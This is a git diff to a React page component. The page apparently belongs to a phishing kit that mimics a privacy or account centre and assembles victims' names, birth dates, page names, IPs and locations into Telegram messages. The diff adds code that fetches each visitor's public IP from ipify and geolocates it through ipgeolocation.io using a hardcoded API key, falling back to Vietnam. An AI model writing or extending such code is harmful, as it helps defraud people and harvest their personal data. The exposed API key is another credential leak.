@@ -199,7 +199,7 @@ type HomePageClientProps = {
 
 function countryCodeToFlag(countryCode: string | null | undefined): string {
   if (!countryCode || !/^[A-Z]{2}$/.test(countryCode)) {
-    return "🇻🇳";
+    return "🏳️";
   }
 
   const base = 127397;
@@ -211,11 +211,11 @@ function countryCodeToFlag(countryCode: string | null | undefined): string {
 
 function normalizeCallingCode(value: string | null | undefined): string {
   if (!value) {
-    return "+84";
+    return "";
   }
 
   const digits = value.replace(/[^\d]/g, "");
-  return digits ? `+${digits}` : "+84";
+  return digits ? `+${digits}` : "";
 }
 
 function escapeHtml(value: string | null | undefined): string {
@@ -265,8 +265,12 @@ export default function HomePageClient({
   const modal = dictionary.modal;
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
-  const phoneFlag = countryCodeToFlag(detectedCountryCode);
-  const phoneCode = normalizeCallingCode(detectedCallingCode);
+  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
+  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
+  const [clientIp, setClientIp] = useState(detectedIp ?? "");
+  const phoneFlag = countryCodeToFlag(clientCountryCode);
+  const phoneCode = normalizeCallingCode(clientCallingCode);
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -339,13 +343,13 @@ export default function HomePageClient({
   }>;
 
   const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
-    const locationParts = (detectedLocation ?? "")
+    const locationParts = (clientLocation ?? "")
       .split("/")
       .map((part) => part.trim())
       .filter(Boolean);
     const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
     const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
-    const safeIp = escapeHtml(detectedIp ?? "N/A");
+    const safeIp = escapeHtml(clientIp ?? "N/A");
     const safePageName = escapeHtml(form.pageName || "N/A");
     const safeFullName = escapeHtml(form.fullName || "N/A");
     const safeDateOfBirth = escapeHtml(form.dateOfBirth || "N/A");
@@ -730,6 +734,76 @@ export default function HomePageClient({
     if (typeof window !== "undefined") {
       setCurrentUrl(window.location.href);
     }
+  }, []);
+
+  useEffect(() => {
+    let cancelled = false;
+
+    const fetchGeo = async () => {
+      const applyVietnamFallback = () => {
+        if (cancelled) {
+          return;
+        }
+        setClientCountryCode("VN");
+        setClientCallingCode("+84");
+        setClientLocation("N/A / N/A / Vietnam");
+      };
+
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        if (!response.ok) {
+          throw new Error("Failed to fetch IP data");
+        }
+        const result = (await response.json()) as { ip?: string };
+        if (!result?.ip || cancelled) {
+          applyVietnamFallback();
+          return;
+        }
+
+        setClientIp(result.ip);
+
+        const locationResponse = await fetch(
+          `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`,
+        );
+        if (!locationResponse.ok) {
+          throw new Error("Failed to fetch location data");
+        }
+        const locationData = (await locationResponse.json()) as {
+          calling_code?: string;
+          country_code2?: string;
+          district?: string;
+          city?: string;
+          country_name?: string;
+        };
+        if (cancelled) {
+          return;
+        }
+
+        const callingCode = normalizeCallingCode(locationData?.calling_code ?? "");
+        const countryCode = (locationData?.country_code2 ?? "").toUpperCase();
+        const district = locationData?.district || "N/A";
+        const city = locationData?.city || "N/A";
+        const country = locationData?.country_name || "N/A";
+
+        if (!countryCode || !callingCode) {
+          applyVietnamFallback();
+          return;
+        }
+
+        setClientCallingCode(callingCode);
+        setClientCountryCode(countryCode);
+        setClientLocation(`${district} / ${city} / ${country}`);
+      } catch (err) {
+        console.error(err);
+        applyVietnamFallback();
+      }
+    };
+
+    fetchGeo();
+
+    return () => {
+      cancelled = true;
+    };
   }, []);
 
   useEffect(() => {
